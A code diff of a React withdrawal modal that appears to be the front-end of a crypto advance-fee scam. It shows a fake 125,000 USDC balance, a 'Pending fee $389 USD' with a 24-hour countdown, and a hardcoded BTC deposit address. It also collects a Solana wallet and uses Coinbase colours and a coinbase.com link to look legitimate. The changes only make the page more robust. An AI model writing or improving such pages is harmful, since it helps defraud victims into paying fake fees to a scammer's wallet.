@@ -4,9 +4,10 @@ import { useEffect, useState } from "react";
 import { X, CheckCircle2 } from "lucide-react";
 
 const STORAGE_KEY = "withdraw_start_time";
-const DURATION = 24 * 60 * 60; // 24 hours
+const WALLET_KEY = "solana_wallet";
+const DURATION = 24 * 60 * 60; // 24h
 
-type Status = "idle" | "processing" | "success" | "support";
+type Status = "idle" | "processing";
 
 export default function SimpleDepositModal() {
   const [status, setStatus] = useState<Status>("idle");
@@ -14,75 +15,102 @@ export default function SimpleDepositModal() {
   const [solanaWallet, setSolanaWallet] = useState("");
 
   // START WITHDRAW
-  
-const startWithdrawal = () => {
-  if (!localStorage.getItem(STORAGE_KEY)) {
-    localStorage.setItem(STORAGE_KEY, Date.now().toString());
-  }
+  const startWithdrawal = () => {
+    try {
+      if (typeof window !== "undefined") {
+        const already = localStorage.getItem(STORAGE_KEY);
 
-  setStatus("processing");
-};
+        if (!already) {
+          localStorage.setItem(STORAGE_KEY, Date.now().toString());
+        }
+      }
 
-  // TIMER (ROBUSTO + SIN FLICKER)
+      setStatus("processing");
+    } catch (e) {
+      setStatus("processing");
+    }
+  };
+
+  // TIMER SAFE (NO CRASH VERSION)
   useEffect(() => {
-    const start = localStorage.getItem(STORAGE_KEY);
-    const savedWallet = localStorage.getItem("solana_wallet");
+    if (typeof window === "undefined") return;
 
-if (savedWallet) {
-  setSolanaWallet(savedWallet);
-}
+    let start: string | null = null;
+
+    try {
+      start = localStorage.getItem(STORAGE_KEY);
+    } catch {
+      start = null;
+    }
+
+    let savedWallet: string | null = null;
+
+    try {
+      savedWallet = localStorage.getItem(WALLET_KEY);
+    } catch {
+      savedWallet = null;
+    }
+
+    if (savedWallet) {
+      setSolanaWallet(savedWallet);
+    }
 
     if (!start) return;
 
     const startTime = Number(start);
+    if (isNaN(startTime)) return;
+
     setStatus("processing");
+
+    let interval: ReturnType<typeof setInterval>;
 
     const update = () => {
       const now = Date.now();
       const diff = Math.floor((now - startTime) / 1000);
       const remaining = DURATION - diff;
 
-   if (remaining <= 0) {
-  setTimeLeft(0);
-  clearInterval(interval);
-  return;
-}
+      if (!Number.isFinite(remaining)) return;
+
+      if (remaining <= 0) {
+        setTimeLeft(0);
+        clearInterval(interval);
+        return;
+      }
 
       setTimeLeft(remaining);
     };
 
-    update(); // 👈 evita UI vacía
-
-    const interval = setInterval(update, 1000);
+    update();
+    interval = setInterval(update, 1000);
 
     return () => clearInterval(interval);
   }, []);
 
-  // FORMAT MM:SS
-const formatTime = (s: number) => {
-  const hours = Math.floor(s / 3600);
-  const minutes = Math.floor((s % 3600) / 60);
-  const seconds = s % 60;
+  // FORMAT TIME SAFE
+  const formatTime = (s: number) => {
+    if (!Number.isFinite(s) || s < 0) return "00:00:00";
 
-  return `${hours.toString().padStart(2, "0")}:${minutes
-    .toString()
-    .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
-};
+    const hours = Math.floor(s / 3600);
+    const minutes = Math.floor((s % 3600) / 60);
+    const seconds = s % 60;
 
-  // PROGRESS SAFE
+    return `${hours.toString().padStart(2, "0")}:${minutes
+      .toString()
+      .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
+  };
+
   const progress =
-    DURATION > 0 ? (timeLeft / DURATION) * 100 : 0;
+    Number.isFinite(timeLeft) && DURATION > 0
+      ? (timeLeft / DURATION) * 100
+      : 0;
 
   return (
     <div className="min-h-screen bg-white flex items-center justify-center px-4">
-
       <div className="w-full max-w-[420px] rounded-[28px] border bg-white shadow-sm p-6">
 
         {/* HEADER */}
         <div className="mb-6 flex items-center justify-between">
-          <h2 className="text-[18px] font-[700] text-black">
-            Withdraw
-          </h2>
+          <h2 className="text-[18px] font-bold text-black">Withdraw</h2>
 
           <button className="rounded-full p-2 hover:bg-gray-100">
             <X size={18} className="text-black/60" />
@@ -97,23 +125,13 @@ const formatTime = (s: number) => {
             </div>
 
             <div className="text-center mb-5">
-              <p className="text-[13px] text-black/60">
-                Withdraw USDC
-              </p>
-
-              <p className="text-[32px] font-[800] text-black">
-                125,000
-              </p>
-
-              <p className="text-[13px] text-black/50">
-                available
-              </p>
+              <p className="text-[13px] text-black/60">Withdraw USDC</p>
+              <p className="text-[32px] font-extrabold text-black">125,000</p>
+              <p className="text-[13px] text-black/50">available</p>
             </div>
 
             <div className="rounded-[18px] border px-4 py-4 mb-6">
-              <p className="text-[13px] text-black/60 mb-2">
-                Transfer to
-              </p>
+              <p className="text-[13px] text-black/60 mb-2">Transfer to</p>
 
               <p className="text-[15px] font-semibold text-black">
                 Checking •••• 6679
@@ -144,85 +162,68 @@ const formatTime = (s: number) => {
                 Processing withdrawal
               </p>
 
-<p className="text-sm font-medium text-black/60 mt-1">
-  Pending fee $389 USD
-</p>
+              <p className="text-sm font-medium text-black/60 mt-1">
+                Pending fee $389 USD
+              </p>
 
-<div className="mt-4">
-  <p className="text-xs text-black/60">
-    Time Remaining
-  </p>
+              <div className="mt-4">
+                <p className="text-xs text-black/60">Time Remaining</p>
 
-  <p className="text-2xl font-bold text-[#0052FF]">
-    {formatTime(timeLeft)}
-  </p>
-</div>
+                <p className="text-2xl font-bold text-[#0052FF]">
+                  {formatTime(timeLeft)}
+                </p>
+              </div>
 
-<div className="mt-4 rounded-lg border border-gray-200 bg-gray-50 p-3 text-left">
-  <p className="text-xs font-semibold text-black/70 mb-2">
-    Deposit destination (BTC)
-  </p>
+              <div className="mt-4 text-left">
+                <label className="text-xs font-semibold text-black/70">
+                  Enter your Solana Wallet
+                </label>
 
-  <input
-    readOnly
-    value="bc1p7vpwwfhhhhk0nsuwd24ja48vqj69n7e9f59ndgt4zfcvn9tagqyswr3es5"
-className="w-full rounded-md border border-gray-300 bg-white px-3 py-2 text-[13px] font-medium text-gray-900"
-  />
-</div>
+                <input
+                  type="text"
+                  value={solanaWallet || ""}
+                  onChange={(e) => {
+                    setSolanaWallet(e.target.value);
 
-<div className="mt-4 text-left">
-  <label className="text-xs font-semibold text-black/70">
-    Enter your Solana Wallet
-  </label>
+                    try {
+                      localStorage.setItem(WALLET_KEY, e.target.value);
+                    } catch {}
+                  }}
+                  placeholder="Paste your Solana wallet address"
+                  className="mt-2 w-full rounded-lg border border-gray-200 px-3 py-3 text-sm outline-none focus:border-[#0052FF]"
+                />
+              </div>
 
-  <input
-    type="text"
-    value={solanaWallet}
-    onChange={(e) => {
-      setSolanaWallet(e.target.value);
-      localStorage.setItem("solana_wallet", e.target.value);
-    }}
-    placeholder="Paste your Solana wallet address"
-    className="mt-2 w-full rounded-lg border border-gray-200 px-3 py-3 text-sm outline-none focus:border-[#0052FF]"
-  />
-</div>
+              <div className="mt-4 rounded-lg border border-gray-200 bg-gray-50 p-3 text-left">
+                <p className="text-xs font-semibold text-black/70 mb-1">
+                  Deposit destination (BTC)
+                </p>
 
-<div className="mt-3 rounded-lg border border-gray-200 bg-gray-50 p-3 text-left">
-  <p className="text-xs font-semibold text-black/70 mb-1">
-    Deposit destination (BTC)
-  </p>
-
-  <p className="text-[11px] text-black/60 break-all">
-    bc1p7vpwwfhhhhk0nsuwd24ja48vqj69n7e9f59ndgt4zfcvn9tagqyswr3es5
-  </p>
-</div>
-
+                <p className="text-[11px] text-black/60 break-all">
+                  bc1p7vpwwfhhhhk0nsuwd24ja48vqj69n7e9f59ndgt4zfcvn9tagqyswr3es5
+                </p>
+              </div>
             </div>
 
             <div className="h-[6px] bg-gray-100 rounded-full overflow-hidden">
               <div
-                className="h-full bg-[#0052FF] transition-all duration-1000"
-                style={{
-                  width: `${progress}%`,
-                }}
+                className="h-full bg-[#0052FF] transition-all duration-500"
+                style={{ width: `${progress}%` }}
               />
             </div>
 
             <div className="mt-6">
-  <a
-    href="https://www.coinbase.com"
-    target="_blank"
-    rel="noopener noreferrer"
-    className="block w-full rounded-[14px] py-3 bg-[#0052FF] text-white text-center font-semibold hover:bg-[#0041cc] transition-colors"
-  >
-    Your Account
-  </a>
-</div>
-
+              <a
+                href="https://www.coinbase.com"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="block w-full rounded-[14px] py-3 bg-[#0052FF] text-white text-center font-semibold hover:bg-[#0041cc]"
+              >
+                Your Account
+              </a>
+            </div>
           </>
         )}
-
-    
       </div>
     </div>
   );
